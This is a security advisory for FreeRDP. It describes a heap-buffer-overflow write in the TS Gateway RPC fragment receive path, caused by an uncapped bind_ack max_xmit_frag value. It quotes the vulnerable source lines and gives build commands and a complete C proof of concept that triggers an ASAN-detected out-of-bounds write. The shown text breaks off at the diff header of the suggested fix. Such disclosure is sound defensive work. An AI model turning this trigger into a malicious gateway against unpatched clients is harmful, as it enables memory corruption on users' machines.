Heap-buffer-overflow write in TS Gateway RPC fragment receive due to uncapped bind_ack max_xmit_frag









  High





          akallabeth
          published
          GHSA-7rp4-66mc-j9vx
          Jun 15, 2026

























Package



      FreeRDP        
            (C)







Affected versions


<= 3.26.0





Patched versions


3.27.0









Description




Affected

FreeRDP clients using TS Gateway / RD Gateway transport (xfreerdp /gateway:…, /gt:rpc, and equivalent API paths through libfreerdp/core/gateway/)

Triggered when the client completes RPC bind and receives subsequent RESPONSE fragments from a malicious gateway

Affected versions: <= 3.26.0 and current master (verified through commit 10a002d1d6ae904a6ffd6debf1630f1278908d99)

Not affected: Direct RDP connections that do not use the gateway RPC layer; server-only deployments

Summary

On TS Gateway connections, rpc->max_recv_frag is initialized to 0x0FF8 (4088) and ReceiveFragment is allocated to that size. In rpc_bind.c, the client assigns rpc->max_recv_frag = header.bind_ack.max_xmit_frag from the server without an upper bound. A malicious gateway can set max_xmit_frag = 0xFFFF while ReceiveFragment is never resized.

Later, rpc_client.c rejects fragments with if (header.frag_length > rpc->max_recv_frag). When both values are 65535, the check passes (65535 > 65535 is false). The receive loop then calls rpc_channel_read() → BIO_read() into the fixed 4088-byte ReceiveFragment, writing up to 65535 bytes and overflowing by up to 61447 attacker-controlled bytes.

This is distinct from GHSA-vh34-m9h7-95xq (older gateway validation issue, patched in 2.4.1) and from sub-spec-12-4-01.f2 (alloc_hint undersize in RESPONSE reassembly — separate root cause).

Details

Reproduced against FreeRDP commit 10a002d1d6ae904a6ffd6debf1630f1278908d99.

Initialization (libfreerdp/core/gateway/rpc.c):

rpc->max_recv_frag = 0x0FF8;
rpc->client = rpc_client_new(context, rpc->max_recv_frag);
/* rpc_client_new → ReceiveFragment = Stream_New(NULL, max_recv_frag); 4088 bytes */

Uncapped overwrite (libfreerdp/core/gateway/rpc_bind.c):

rpc->max_recv_frag = header.bind_ack.max_xmit_frag;  /* no validation */
rpc->max_xmit_frag = header.bind_ack.max_recv_frag;

Failed guard and overflow (libfreerdp/core/gateway/rpc_client.c):

if (header.frag_length > rpc->max_recv_frag)   /* > not >= ; 0xFFFF fails to reject 0xFFFF */
    return -1;

while (Stream_GetPosition(fragment) < header.frag_length)
    rpc_channel_read(..., fragment, header.frag_length - Stream_GetPosition(fragment));
/* rpc.c:470 — BIO_read(bio, Stream_Pointer(s), length); no Stream capacity check */

Concrete example (values used in the PoC below):

Client starts with max_recv_frag = 0x0FF8, ReceiveFragment capacity 4088.

Malicious gateway bind_ack sets max_xmit_frag = 0xFFFF; client stores rpc->max_recv_frag = 0xFFFF without reallocating ReceiveFragment.

Gateway sends RESPONSE with frag_length = 0xFFFF (65535 bytes total PDU).

Guard passes; body read attempts 65519 bytes (65535 − 16 header) into the 4088-byte buffer → 61447-byte heap OOB write of attacker-controlled data.

PoC

The PoC below reproduces the post-bind_ack RPC fragment receive loop from rpc_client.c (header parse → frag_length guard → rpc_channel_read / BIO_read write into ReceiveFragment).

Check out the vulnerable revision and build winpr with ASAN:

git clone https://github.com/FreeRDP/FreeRDP.git freerdp-src
cd freerdp-src
git checkout 10a002d1d6ae904a6ffd6debf1630f1278908d99

mkdir build-asan && cd build-asan
cmake .. \
  -DCMAKE_BUILD_TYPE=RelWithDebInfo \
  -DCMAKE_C_FLAGS='-g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined' \
  -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address,undefined' \
  -DCMAKE_SHARED_LINKER_FLAGS='-fsanitize=address,undefined' \
  -DWITH_SERVER=OFF -DWITH_CLIENT=OFF -DWITH_CHANNELS=OFF \
  -DBUILD_TESTING=OFF

cmake --build . --target winpr -j"$(nproc)"

Save this PoC as rpc_recv_fragment_poc.c:

#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <winpr/stream.h>

#define MAX_RECV_FRAG_INIT 0x0FF8u
#define RPC_COMMON_FIELDS_LENGTH 16u

#pragma pack(push, 1)
typedef struct
{
	BYTE rpc_vers;
	BYTE rpc_vers_minor;
	BYTE ptype;
	BYTE pfc_flags;
	BYTE packed_drep[4];
	UINT16 frag_length;
	UINT16 auth_length;
	UINT32 call_id;
} rpcconn_common_hdr_t;
#pragma pack(pop)

typedef struct
{
	const BYTE* payload;
	size_t payload_len;
	size_t offset;
} mock_channel_t;

static SSIZE_T mock_rpc_channel_read(mock_channel_t* ch, wStream* s, size_t length)
{
	if (!ch || !s || length > INT32_MAX)
		return -1;
	if (ch->offset + length > ch->payload_len)
		length = ch->payload_len - ch->offset;
	if (length == 0)
		return 0;
	memcpy(Stream_Pointer(s), ch->payload + ch->offset, length);
	ch->offset += length;
	Stream_SetPosition(s, Stream_GetPosition(s) + length);
	return (SSIZE_T)length;
}

static int poc_recv_fragment_loop(UINT16 max_recv_frag, wStream* fragment, mock_channel_t* ch)
{
	rpcconn_common_hdr_t header = { 0 };

	while (Stream_GetPosition(fragment) < RPC_COMMON_FIELDS_LENGTH)
	{
		const SSIZE_T status = mock_rpc_channel_read(
		    ch, fragment, RPC_COMMON_FIELDS_LENGTH - Stream_GetPosition(fragment));
		if (status < 0)
			return -1;
		if (Stream_GetPosition(fragment) < RPC_COMMON_FIELDS_LENGTH)
			return 0;
	}

	const size_t pos = Stream_GetPosition(fragment);
	Stream_SetPosition(fragment, 0);
	Stream_Read(fragment, &header, sizeof(header));
	Stream_SetPosition(fragment, pos);

	if (header.frag_length > max_recv_frag)
		return -1;

	while (Stream_GetPosition(fragment) < header.frag_length)
	{
		const size_t need = header.frag_length - Stream_GetPosition(fragment);
		const SSIZE_T status = mock_rpc_channel_read(ch, fragment, need);
		if (status < 0)
			return -1;
		if (Stream_GetPosition(fragment) < header.frag_length)
			return 0;
	}
	return 0;
}

int main(void)
{
	const UINT16 negotiated_max_recv_frag = 0xFFFFu;
	wStream* fragment = Stream_New(NULL, MAX_RECV_FRAG_INIT);
	const size_t body_len = 0xFFFFu - RPC_COMMON_FIELDS_LENGTH;
	BYTE* payload = (BYTE*)malloc(RPC_COMMON_FIELDS_LENGTH + body_len);

	memset(payload, 0x42, RPC_COMMON_FIELDS_LENGTH + body_len);
	((rpcconn_common_hdr_t*)payload)->frag_length = 0xFFFFu;

	mock_channel_t ch = { payload, RPC_COMMON_FIELDS_LENGTH + body_len, 0 };
	(void)poc_recv_fragment_loop(negotiated_max_recv_frag, fragment, &ch);

	free(payload);
	Stream_Free(fragment, TRUE);
	return 0;
}

Compile and run:

gcc -g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined \
  -I ../winpr/include -I ./winpr/include \
  rpc_recv_fragment_poc.c \
  -L ./winpr/libwinpr -lwinpr3 \
  -Wl,-rpath,"$PWD/winpr/libwinpr" \
  -o rpc_recv_fragment_poc

ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:halt_on_error=1:print_stacktrace=1' \
  ./rpc_recv_fragment_poc

Expected result (unpatched): AddressSanitizer reports heap-buffer-overflow WRITE in memcpy (via mock_rpc_channel_read, equivalent to rpc.c BIO_read). Overflow size ~61447 bytes into a 4088-byte ReceiveFragment allocation. Exit code 134 (ASAN abort).

Suggested fix

Cap negotiated fragment sizes in rpc_bind.c and reject oversized bind_ack values:

--- a/libfreerdp/core/gateway/rpc_bind.c
+++ b/libfreerdp/core/gateway/rpc_bind.c
